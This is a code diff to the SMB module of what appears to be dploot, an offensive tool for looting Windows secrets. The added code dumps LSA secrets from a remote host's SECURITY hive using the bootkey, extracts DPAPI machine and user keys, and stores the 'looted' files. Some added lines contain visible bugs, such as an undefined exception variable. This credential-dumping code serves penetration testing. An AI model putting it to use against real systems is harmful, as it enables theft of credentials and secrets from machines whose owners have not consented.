@@ -1,19 +1,20 @@
+from binascii import hexlify, unhexlify
 import ntpath
 import os
 import logging
 import time
 
-from typing import Any
+from typing import Any, Dict, List
 
 from dploot.lib.network import DPLootConnection
 from dploot.lib.target import Target
 
+from impacket.dcerpc.v5 import rrp
+from impacket.system_errors import ERROR_NO_MORE_ITEMS, ERROR_FILE_NOT_FOUND
 from impacket.smbconnection import SMBConnection
-from impacket.smb import SMB_DIALECT
 from impacket.nmb import NetBIOSTimeout
-from impacket.smb import FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE
-from impacket.dcerpc.v5 import tsts
-from impacket.examples.secretsdump import RemoteOperations
+from impacket.smb import FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE, SMB_DIALECT
+from impacket.examples.secretsdump import RemoteOperations, LSASecrets
 from impacket.smb3structs import (
     FILE_READ_DATA,
     FILE_OPEN,
@@ -26,9 +27,10 @@ class DPLootSMBConnection(DPLootConnection):
     def __init__(self, target: Target) -> None:
         super().__init__(target)
         self.smb_session = None
-        self.smbv1 = False
+        self._remote_ops = None
+        self._bootkey = None
 
-    def create_smbv1_conn(self, kdc=""):
+    def __create_smbv1_conn(self, kdc=""):
         try:
             self.smb_session = SMBConnection(
                 kdc or self.target.address,
@@ -36,7 +38,6 @@ class DPLootSMBConnection(DPLootConnection):
                 None,
                 preferredDialect=SMB_DIALECT,
             )
-            self.smbv1 = True
         except OSError as e:
             if str(e).find("Connection reset by peer") != -1:
                 logging.debug(
@@ -51,14 +52,13 @@ class DPLootSMBConnection(DPLootConnection):
 
         return True
 
-    def create_smbv3_conn(self, kdc=""):
+    def __create_smbv3_conn(self, kdc=""):
         try:
             self.smb_session = SMBConnection(
                 kdc or self.target.address,
                 kdc or self.target.address,
                 None,
             )
-            self.smbv1 = False
         except OSError as e:
             if str(e).find("Too many open files") != -1:
                 logging.error(
@@ -73,8 +73,8 @@ class DPLootSMBConnection(DPLootConnection):
 
         return True
 
-    def create_conn_obj(self, kdc=""):
-        if self.create_smbv3_conn(kdc) or self.create_smbv1_conn(kdc):
+    def __create_conn_obj(self, kdc=""):
+        if self.__create_smbv3_conn(kdc) or self.__create_smbv1_conn(kdc):
             return True
         logging.debug(
             "Could not create connection object to %s"
@@ -82,28 +82,66 @@ class DPLootSMBConnection(DPLootConnection):
         )
         return False
 
-    def connect(self) -> "Any | None":
+    def __reconnect(self) -> bool:
+        if self.remote_ops is not None:
+            self.remote_ops.finish()
+        self.smb_session.reconnect()
+
+    def __get_hive_to_rrphandle(self, hive:str) -> bytes:
+        if hive.lower() == "hkcr":
+            return rrp.hOpenClassesRoot(self.remote_ops._RemoteOperations__rrp)["phKey"]
+        elif hive.lower() == "hkcu":
+            return rrp.hOpenCurrentUser(self.remote_ops._RemoteOperations__rrp)["phKey"]
+        elif hive.lower() == "hklm":
+            return rrp.hOpenLocalMachine(self.remote_ops._RemoteOperations__rrp)["phKey"]
+        elif hive.lower() == "hku":    
+            return rrp.hOpenUsers(self.remote_ops._RemoteOperations__rrp)["phKey"]
+        else:
+            raise ValueError(f"Unknown hive {hive}")
+        
+    @property
+    def remote_ops(self) -> RemoteOperations:
+        if self._remote_ops is not None:
+            return self._remote_ops
+        logging.getLogger("impacket").disabled = True
         try:
+            self._remote_ops = RemoteOperations(
+                self.smb_session, self.target.do_kerberos, self.target.dc_ip
+            )
+            self._remote_ops.enableRegistry()
+        except Exception as e:
+            logging.error(f"RemoteOperations failed: {e}")
+
+        return self._remote_ops
+    
+    @property
+    def bootkey(self):
+        if self._bootkey is not None:
+            return self._bootkey
+        self._bootkey = self.remote_ops.getBootKey()
+        return self._bootkey
+
+    # Common protocol functions
+
+    def connect(self) -> bool:
+        try:
+            logging.debug("Connecting to %s through SMB" % self.target.address)
             if self.target.do_kerberos:
                 # getting hostname
-                no_ntlm = False
-                if not self.create_conn_obj():
-                    return None
+                if not self.__create_conn_obj():
+                    return False
                 try:
                     self.smb_session.login("", "")
                 except Exception as e:
                     if "STATUS_NOT_SUPPORTED" in str(e):
-                        no_ntlm = True
-                hostname = (
-                    self.smb_session.getServerDNSHostName()
-                    if not no_ntlm
-                    else self.target.address
-                )
+                        logging.error("Kerberos authentication is not supported by this host. Please try to connect with NTLM.")
+                        return False
+                hostname = self.smb_session.getServerDNSHostName()
                 self.smb_session.close()
                 self.target.address = hostname
-                logging.debug("Connecting to %s" % self.target.address)
-                if not self.create_conn_obj(self.target.address):
-                    return None
+                
+                if not self.__create_conn_obj(self.target.address):
+                    return False
                 logging.debug(
                     "Authenticating with %s through Kerberos" % self.target.username
                 )
@@ -119,9 +157,8 @@ class DPLootSMBConnection(DPLootConnection):
                 )
                 self.target.username = self.smb_session.getCredentials()[0]
             else:
-                logging.debug("Connecting to %s" % self.target.address)
-                if not self.create_conn_obj():
-                    return None
+                if not self.__create_conn_obj():
+                    return False
                 logging.debug(
                     "Authenticating with %s through NTLM" % self.target.username
                 )
@@ -138,10 +175,10 @@ class DPLootSMBConnection(DPLootConnection):
 
                 traceback.print_exc()
                 logging.debug(str(e))
-            return None
-        return self.smb_session
+            return False
+        return True
 
-    def remote_list_dir(self, share, path, wildcard=True) -> "Any | None":
+    def list_dir(self, path, share:str="C$", wildcard:bool=True) -> "Any | None":
         if wildcard:
             path = ntpath.join(path, "*")
         try:
@@ -159,55 +196,21 @@ class DPLootSMBConnection(DPLootConnection):
         except Exception:
             is_admin = False
         return is_admin
-
-    def listPath(self, *args, **kwargs) -> Any:
-        return self.smb_session.listPath(*args, **kwargs)
     
-    def list_users(self, share):
-        users_dir_path = "Users\\*"
-        directories = self.listPath(
-            shareName=share, path=ntpath.normpath(users_dir_path)
-        )
-        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]
-
-    def reconnect(self) -> bool:
-        self.smb_session.reconnect()
-        if self.remote_ops is not None:
-            self.enable_remoteops(force=True)
-
-    def enable_remoteops(self, force=False) -> None:
-        logging.getLogger("impacket").disabled = True
-        if self.remote_ops is not None and self.bootkey is not None and not force:
-            return
-        try:
-            self.remote_ops = RemoteOperations(
-                self.smb_session, self.target.do_kerberos, self.target.dc_ip
-            )
-            self.remote_ops.enableRegistry()
-            self.bootkey = self.remote_ops.getBootKey()
-        except Exception as e:
-            logging.error(f"RemoteOperations failed: {e}")
-
-    def getFile(self, *args, **kwargs) -> "Any | None":
-        return self.smb_session.getFile(*args, **kwargs)
-
-    def readFile(
+    def read_file(
         self,
-        shareName,
         path,
-        mode=FILE_OPEN,
+        share:str="C$",
+        looted_files=None,
         offset=0,
-        password=None,
-        shareAccessMode=FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         bypass_shared_violation=False,
-        looted_files=None
     ) -> bytes:
-        # ToDo: Handle situations where share is password protected
+        shareAccessMode=FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
         path = path.replace("/", "\\")
         path = ntpath.normpath(path)
         if len(path) > 0 and path[0] == "\\":
             path = path[1:]
-        treeId = self.smb_session.connectTree(shareName)
+        treeId = self.smb_session.connectTree(share)
         fileId = None
 
         data = None
@@ -219,7 +222,7 @@ class DPLootSMBConnection(DPLootConnection):
                 FILE_READ_DATA,
                 shareAccessMode,
                 FILE_NON_DIRECTORY_FILE,
-                mode,
+                FILE_OPEN,
                 0,
             )
             fileInfo = self.smb_session.queryInfo(treeId, fileId)
@@ -256,25 +259,22 @@ class DPLootSMBConnection(DPLootConnection):
                 while True:
                     try:
                         filepath = ntpath.join("Windows\\Temp\\",wmiexec.output)
-                        data = self.readFile(shareName=shareName, path=filepath)
+                        data = self.read_file(share=share, path=filepath)
                         break
                     except Exception as e:
                         if str(e).find("STATUS_SHARING_VIOLATION") >= 0:
                             # Output not finished, let's wait
                             time.sleep(1)
-                self.smb_session.deleteFile(shareName, filepath)
+                self.smb_session.deleteFile(share, filepath)
             elif str(e).find("Broken") >= 0:
                 logging.debug("Connection broken, trying to recreate it")
-                self.reconnect()
-                data = self.readFile(
-                    shareName=shareName,
+                self.__reconnect()
+                data = self.read_file(
                     path=path,
-                    mode=mode,
+                    share=share,
+                    looted_files=looted_files,
                     offset=offset,
-                    password=password,
-                    shareAccessMode=shareAccessMode,
                     bypass_shared_violation=bypass_shared_violation,
-                    looted_files=looted_files
                 )
             else:
                 logging.debug(str(e))
@@ -286,193 +286,121 @@ class DPLootSMBConnection(DPLootConnection):
         if looted_files is not None and data is not None and data != b"":
             looted_files[os.path.join(*(path.split("\\")))]=data
         return data
+    
+    def reg_enum_key(self, hive:str, path:str) -> List[str]:
+        keys = []
+        reg_handle = self.__get_hive_to_rrphandle(hive)
 
-    def perform_taskkill(self, process_name):
-        with tsts.LegacyAPI(self.smb_session, self.target.address, self.target.do_kerberos) as legacy:
-            handle = legacy.hRpcWinStationOpenServer()
-            r = legacy.hRpcWinStationGetAllProcesses(handle)
-            if not len(r):
-                logging.debug("Could not get process list")
-                return
-            pid_list = [
-                i["UniqueProcessId"]
-                for i in r
-                if i["ImageName"].lower() == process_name.lower()
-            ]
-            if not len(pid_list):
-                logging.debug(f"No process {process_name} found")
-            logging.debug(f"Found {pid_list} pid(s) for process {process_name}")
-            for pid in pid_list:
-                logging.debug(f"Killing PID {pid}")
-                try:
-                    if legacy.hRpcWinStationTerminateProcess(handle, pid)["ErrorCode"]:
-                        logging(f"Successfully killed process {pid}")
-                    else:
-                        logging(f"Could not kill process {pid}")
-                except Exception as e:
-                    logging.error(f"Error while terminating pid {pid}: {e}")
+        ans = rrp.hBaseRegOpenKey(
+                self.remote_ops._RemoteOperations__rrp,
+                reg_handle,
+                path,
+                samDesired=rrp.KEY_ENUMERATE_SUB_KEYS,
+            )
+        key_handle = ans["phkResult"]
+        i = 0
+        while True:
+            try:
+                enum_ans = rrp.hBaseRegEnumKey(
+                    self.remote_ops._RemoteOperations__rrp, key_handle, i
+                )
+                keys.append(enum_ans["lpNameOut"][:-1])
+                i += 1
+            except rrp.DCERPCSessionError as e:
+                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
+                    break
+            except Exception as e:
+                import traceback
 
+                traceback.print_exc()
+                logging.error(str(e))
+        rrp.hBaseRegCloseKey(self.remote_ops._RemoteOperations__rrp, key_handle)
+        return keys
 
-class DPLootLocalSMBConnection(DPLootSMBConnection):
-    systemroot = "C:\\Windows"
-    hklm_software_path = r"Windows/System32/config/SOFTWARE"
-
-    def __init__(self, target=None) -> None:
-        super().__init__(target)
-        self.local_ops = None
-        self.local_session = True
-        self.smb_session = DPLootDummySession()
-        # the following are functions that should never be called on this class.
-        self.enable_remoteops = None
-        self.reconnect = None
-
-
-    def connect(self) -> "Any | None":
-        return self.smb_session
-
-    def is_admin(self) -> bool:
-        return True
-
-    def enable_localops(self, systemHive, force=False) -> None:
-        if self.local_ops is not None and self.bootkey is not None and not force:
-            return
-        try:
-            self.local_ops = LocalOperations(systemHive)
-            self.bootkey = self.local_ops.getBootKey()
-        except Exception as e:
-            logging.error(f"LocalOperations failed: {e}")
-
-    # we 'emulate' remote file operations by converting local os.DirEntry() to impacket.SharedFile()
-    def _sharedfile_fromdirentry(d: os.DirEntry):
-        (filesize, atime, mtime, ctime) = d.stat(follow_symlinks=False)[6:]
-        attribs = 0
-        if d.is_dir(follow_symlinks=False):
-            attribs |= ATTR_DIRECTORY
-        return SharedFile(ctime, atime, mtime, filesize, None, attribs, d.name, d.name)
-
-    SharedFile.fromDirEntry = _sharedfile_fromdirentry
-
-    def remote_list_dir(self, share, path, wildcard=True) -> list[SharedFile]:
-        path = self.get_real_path(path)
-        if not wildcard:
-            raise NotImplementedError("Not implemented for wildcard == False")
-        try:
-            result = list(map(SharedFile.fromDirEntry, os.scandir(path)))
-        except FileNotFoundError:
-            result = []
-        return result
-
-    def list_users(self, share):
-        users_dir_path = "Users\\*"
-        directories = self.listPath(
-            shareName=share, path=ntpath.normpath(users_dir_path)
+    def reg_enum_values(self, hive:str, keypath:str) -> List[str]:
+        values_names = []
+        reg_handle = self.__get_hive_to_rrphandle(hive)
+        ans = rrp.hBaseRegOpenKey(
+            self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
         )
-        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]
+        i = 0
+        while True:
+            try:
+                ans2 = rrp.hBaseRegEnumValue(
+                    self.remote_ops._RemoteOperations__rrp,
+                    ans['phkResult'], i)
+                lp_value_name = ans2['lpValueNameOut'][:-1]
+                values_names.append(lp_value_name)
+                i += 1
+            except rrp.DCERPCSessionError as e:
+                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
+                    break
+        return values_names
 
-    def listPath(self, shareName: str = "C$", path: Optional[str] = None, password: Optional[str] = None):
-        if path[-2:] == r"\*":
-            return self.remote_list_dir(shareName, path[:-2], wildcard=True)
-        if path[-1] == "*":
-            return self.remote_list_dir(shareName, path[:-1], wildcard=True)
-        else:
-            raise NotImplementedError("Not implemented for wildcard == False")
-
-    def getFile(self, *args, **kwargs) -> "Any | None":
-        raise NotImplementedError("getFile is not implemented in LOCAL mode")
-
-    def get_real_path(self, path:str) -> str:
-        """Match path against file system (case insensitive if py>=3.12).
-            Only used when target is `LOCAL`.
-
-        Args:
-            path (str): pah representation (ie C:\\Windows\\...)
-
-        Returns:
-            str: real path on the filesystem
-
-        """
-        # clean path (remove c:\, /, and current root if already present)
-        path=path.removeprefix(self.target.local_root)
-        if path[:3].lower() == "c:\\":
-            path = path[3:]
-        path=path.replace("\\", os.sep).lstrip(os.sep)
-
-        globok = False
-        # The pattern to match does not contain jokers, so Path.glob() should return 0 or 1 match
+    def reg_get_key_value(self, hive:str, keypath:str, value_name:str) -> Any:
+        reg_handle = self.__get_hive_to_rrphandle(hive)
+        value = None
+        ans = rrp.hBaseRegOpenKey(
+            self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
+        )
+        key_handle = ans["phkResult"]
         try:
-            path=next(Path(self.target.local_root).glob(path, case_sensitive=False))
-            globok=True
-        except (StopIteration, TypeError):
-            # StopIteration: path does not exist.
-            # TypeError: unexpexted keyword (case_sensitive added in python 3.12)
-            # Return a representation of path anyway
-            path=os.path.join(self.target.local_root, path)
-
-        #logging.debug(f"get_real_path: [{globok=}] returning {path}")
-        return str(path)
-
-    def readFile(
-        self,
-        shareName,
-        path,
-        mode=FILE_OPEN,
-        offset=0,
-        password=None,
-        shareAccessMode=FILE_SHARE_READ,
-        bypass_shared_violation=False,
-        looted_files=None
-    ) -> bytes:
-        data = None
+            ans = rrp.hBaseRegOpenKey(
+                self.remote_ops._RemoteOperations__rrp, reg_handle, keypath
+            )
+            key_handle = ans["phkResult"]
+            _, value = rrp.hBaseRegQueryValue(
+                self.remote_ops._RemoteOperations__rrp, key_handle, value_name
+            )
+        except rrp.DCERPCSessionError as e:
+            if e.get_error_code() == ERROR_FILE_NOT_FOUND:
+                logging.debug(f"Exception in SMB reg_get_key_value({hive},{keypath},{value_name}): Key not found")
+            else:
+                logging.debug(f"Exception in SMB reg_get_key_value({hive},{keypath},{value_name}): {e}")
+        rrp.hBaseRegCloseKey(self.remote_ops._RemoteOperations__rrp, key_handle)
+        return value
+    
+    def get_dpapi_system_keys(self, looted_files=None) -> Dict[str,bytes]:
+        dpapiSystem = {}
+        logging.getLogger("impacket").disabled = True
+        if self.bootkey:
+            logging.debug(f"Got Bootkey: {hexlify(self.bootkey)}")
+            if looted_files is not None:
+                # SMB secretsdump never "dumps" the SYSTEM, it just extracts the bootkey
+                # but we can save it in a separate file
+                looted_files["Windows/System32/config/SYSTEM_bootkey"]=self.bootkey
         try:
-            with open(self.get_real_path(path), "rb") as f:
-                data = f.read()
+            SECURITYFileName = (
+                self.remote_ops.saveSECURITY()
+            )
+        except:
+            logging.error("saveSECURITY failed: %s" % str(e))
+            # retrieve DPAPI keys
+        def getDPAPI_SYSTEM(_, secret) -> None:
+            if secret.startswith("dpapi_machinekey:"):
+                machineKey, userKey = secret.split("\n")
+                machineKey = machineKey.split(":")[1]
+                userKey = userKey.split(":")[1]
+                dpapiSystem["MachineKey"] = unhexlify(machineKey[2:])
+                dpapiSystem["UserKey"] = unhexlify(userKey[2:])
+        
+        if looted_files is not None:
+            # if you wanna loot the SECURITY, let's do it
+            temp_security_file_name = SECURITYFileName._RemoteFile__fileName
+            self.read_file(temp_security_file_name, share="ADMIN$", looted_files=looted_files)
+            looted_files["Windows/System32/config/SECURITY"] = looted_files.pop(os.path.join(*(temp_security_file_name.split("\\"))))
+
+        try:
+            LSA = LSASecrets(
+                SECURITYFileName,
+                self.bootkey,
+                self.remote_ops,
+                isRemote=True,
+                perSecretCallback=getDPAPI_SYSTEM,
+            )
+            LSA.dumpSecrets()
+            LSA.finish()
         except Exception as e:
-            logging.debug(f"Exception occurred while trying to read {path}: {e!r}")
+            logging.error("LSA hashes extraction failed: %s" % str(e))
 
-        return data
-
-    def getUsersProfiles(self) -> dict[str, str] | None:
-        """Returns the list of user profiles (from registry) in a dict
-
-        Each subkey of HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList is a user SID,
-        and the ProfileImagePath value inside is the path to the user's profile
-        :return: dict of user_sid: path_to_profile
-
-        """
-        if self._usersProfiles is not None:
-            return self._usersProfiles
-
-        result = {}
-        # open hive
-        reg_file_path = self.get_real_path(self.hklm_software_path)
-        reg = Registry(reg_file_path, isRemote=False)
-
-        # open key
-        key_path = "Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
-        parentKey = reg.findKey(key_path)
-        if parentKey is None:
-            logging.error(f"Key {key_path} not found in {reg_file_path}")
-            return None
-
-        for user_sid in reg.enumKey(parentKey):
-            # get 'ProfileImagePath' value
-            (_, path) = reg.getValue(
-                ntpath.join(key_path, user_sid, "ProfileImagePath")
-            )
-            path = (
-                path.decode("utf-16le")
-                .rstrip("\0")
-                .replace(r"%systemroot%", self.systemroot)
-            )
-            path = ntpath.normpath(path)
-            path = self.get_real_path(path)
-            # store in result dict
-            result[user_sid] = path
-
-        self._usersProfiles = result
-        return self._usersProfiles
-
-
-class DPLootDummySession:
-    def login(*args, **kwargs) -> bool:
-        return True
+        return dpapiSystem
